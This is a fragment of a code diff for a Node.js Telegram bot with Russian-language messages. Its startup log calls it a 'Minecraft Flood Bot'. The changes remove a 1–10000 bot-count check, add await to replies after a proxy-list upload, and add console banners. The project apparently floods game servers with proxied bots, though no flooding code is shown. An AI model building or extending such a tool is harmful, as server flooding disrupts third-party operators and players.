-        if (isNaN(count) || count < 1 || count > 10000) {
-            return ctx.reply('❌ Введите число от 1 до 10000');
-        }
-        
-        ctx.session.botCount = count;
-        askForProxies(ctx);
-        ctx.session.state = null;
     }
 });
 
@@ -790,7 +772,7 @@ bot.on('document', async (ctx) => {
         user.proxies = proxies;
         users.set(userId, user);
         
-        ctx.replyWithHTML(
+        await ctx.replyWithHTML(
             `<b>✅ Загружено ${proxies.length} прокси</b>`,
             Markup.inlineKeyboard([
                 [Markup.button.callback('🌐 Управление прокси', 'proxies_menu')]
@@ -800,16 +782,17 @@ bot.on('document', async (ctx) => {
         ctx.session = null;
         
     } catch (e) {
-        ctx.reply(`❌ Ошибка загрузки: ${e.message}`);
+        await ctx.reply(`❌ Ошибка загрузки: ${e.message}`);
     }
 });
 
 // ========== ЗАПУСК ==========
 bot.launch();
+console.log('\n' + '='.repeat(50));
 console.log('🤖 Minecraft Flood Bot запущен!');
 console.log('✅ 100% рабочая версия на Node.js');
 console.log('👑 Владелец: @artem_bori');
+console.log('='.repeat(50) + '\n');
 
-// Graceful shutdown
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
